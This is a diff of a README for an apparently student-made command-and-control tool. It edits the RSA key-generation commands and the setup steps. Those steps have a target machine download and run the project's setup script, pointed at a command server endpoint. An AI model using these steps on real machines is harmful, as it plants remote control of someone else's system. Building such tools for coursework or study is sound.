@@ -9,8 +9,8 @@ David Trakhtengerts : dst726 and Ricky Woodruff : rgw664
 ### Generate keys
 
 ```bash
-openssl genrsa -out rsa.private 1024
-openssl rsa -in rsa.private -out rsa.public -pubout -outform PEM
+openssl genrsa -out private.pem 1024
+openssl rsa -in private.pem -pubout -out public.pem
 ```
 
 ### Target Machine
@@ -19,7 +19,8 @@ openssl rsa -in rsa.private -out rsa.public -pubout -outform PEM
 curl -L http://github.com/woodruffr4/Command-Control/archive/main.tar.gz | tar zxf -
 cd Command-Control-main
 chmod +x setup.sh
-./setup.sh {Your Server Endpoint} # Example: ./setup.sh http://10.0.2.4:5000/commands
+./setup.sh {Your Server Endpoint}
+# Example: ./setup.sh http://10.0.2.4:5000/commands
 ```
 
 ### Attack Machine
